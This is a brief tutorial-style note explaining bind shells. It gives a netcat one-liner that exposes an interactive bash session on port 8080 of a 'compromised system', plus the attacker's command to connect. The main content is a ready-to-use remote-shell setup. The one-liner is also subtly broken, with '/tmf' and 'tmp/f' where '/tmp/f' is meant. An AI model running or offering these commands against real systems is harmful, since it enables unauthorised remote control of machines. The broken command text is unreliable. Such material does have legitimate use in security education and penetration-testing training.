Bind shell binds a port on the compromised system and listen for a connection. When this connection occurs, it exposes the shell session so that the attacker can execute commands remotely.

The word bind means attach a program (like a shell) to a specific network port so it can listen for incoming connections.

So when you run a bind shell, your shell program is literally binding itself to a port on your computer.

Bind shell - binds itself, waits for callers
Reverse shell - reaches out, calls the listener

#### Setting it up on the target 

```bash
rm -f /tmf; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > tmp/f
```

```bash
| nc -l 0.0.0.0 8080
```

This commands starts Netcat in listen mode (-l) on all interfaces and port 8080. The shell will be exposed to the attacker once they connect to this port.

Ports below 1024 will require Netcat to be executed with elevated privileges. In this case using port 8080 will avoid this.

#### Attacker connects to the bind shell

Now that the target machine is waiting for incoming connections, we can use Netcat with the following command  to connect

```bash
nc -nv Target_IP 8080
```